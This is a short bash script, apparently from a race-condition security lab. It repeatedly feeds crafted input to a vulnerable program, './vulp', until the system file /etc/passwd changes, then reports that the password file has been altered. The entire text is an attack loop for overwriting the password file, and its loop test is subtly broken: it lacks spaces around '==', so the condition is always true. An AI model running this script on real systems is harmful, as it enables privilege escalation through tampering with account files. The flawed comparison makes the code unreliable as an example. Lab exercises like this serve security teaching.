 #!/bin/bash
 CHECK="ls -l /etc/passwd"
 old=$($CHECK)
 new=$($CHECK)
 while [ "$old"=="$new" ]
 do
    ./vulp<passwd_input
    new=$($CHECK)
done
echo "STOP .....The paaswd has been changed"